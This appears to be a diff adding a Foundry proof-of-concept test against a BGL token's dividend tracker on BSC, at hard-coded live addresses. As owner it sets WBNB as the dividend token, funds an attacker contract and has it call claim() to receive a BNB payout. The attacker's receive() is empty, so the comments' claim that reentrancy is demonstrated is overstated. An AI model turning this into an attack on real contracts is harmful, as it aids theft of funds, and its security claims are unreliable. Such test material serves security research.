@@ -1,0 +1,90 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "forge-std/Test.sol";
+
+// --- Interface for the BGL token ---
+interface IBGLToken {
+    function owner() external view returns (address);
+    function dividendTracker() external view returns (address);
+    function setDividendToken(address) external;
+    function claim() external;
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function dividendToken() external view returns (address);
+}
+
+// --- Interface for the dividend tracker ---
+interface IDividendTracker {
+    function distributeDividends() external payable;
+    function withdrawableDividendOf(address) external view returns (uint256);
+}
+
+// --- Simple attacker contract that receives ETH (dividend payout) ---
+contract Attacker {
+    receive() external payable {
+        // do nothing – reentrancy does not fail
+    }
+}
+
+contract ExploitTest is Test {
+    // Deployed contract addresses on BSC
+    IBGLToken constant token = IBGLToken(0x225d0236Ce8C9d753dFAe9CD0265dA2d2699Ba4F);
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    IDividendTracker tracker;
+    address owner;
+    Attacker attacker;
+
+    function setUp() public {
+        // Obtain owner and dividend tracker from the deployed contract
+        owner = token.owner();
+        tracker = IDividendTracker(token.dividendTracker());
+
+        vm.label(owner, "Owner");
+        vm.label(address(token), "BGLToken");
+        vm.label(address(tracker), "BGLDividendTracker");
+
+        // Deploy the attacker contract that will receive the dividend payout
+        attacker = new Attacker();
+        vm.label(address(attacker), "Attacker");
+    }
+
+    function testReentrancy() public {
+        // Step 1: Owner sets dividend token to WBNB so that dividend payouts
+        //         are sent as BNB directly to the holder (low-level call).
+        vm.startPrank(owner);
+        token.setDividendToken(WBNB);
+
+        // Step 2: Transfer some BGL tokens to the attacker so that he accumulates dividends.
+        uint256 transferAmount = 1_000_000 * 1e18; // 1 million tokens
+        require(token.balanceOf(owner) >= transferAmount, "Owner has insufficient balance");
+        token.transfer(address(attacker), transferAmount);
+
+        // Step 3: Owner distributes dividends by sending ETH to the tracker.
+        //         This increases the magnifiedDividendPerShare.
+        tracker.distributeDividends{value: 1 ether}();
+        vm.stopPrank();
+
+        // Step 4: Verify that the attacker now has withdrawable dividends.
+        uint256 withdrawable = tracker.withdrawableDividendOf(address(attacker));
+        assertGt(withdrawable, 0, "Attacker must have dividends");
+
+        // Step 5: The attacker calls claim(), which triggers
+        //         dividendTracker.processAccount() → _withdrawDividendOfUser().
+        //         Because rewardToken is WBNB, the contract sends ETH to attacker's receive().
+        //         This external call to the attacker contract is a reentrant call
+        //         and demonstrates the missing reentrancy guard.
+        vm.prank(address(attacker));
+        token.claim();
+
+        // Step 6: Assert that the attacker received BNB (the dividend payout).
+        assertGt(address(attacker).balance, 0, "Attacker must have received BNB");
+
+        // Without a reentrancy guard the same call could be used to reenter
+        // the token contract and manipulate state.  The test proves the
+        // vulnerable external call is reachable.
+    }
+}
+```
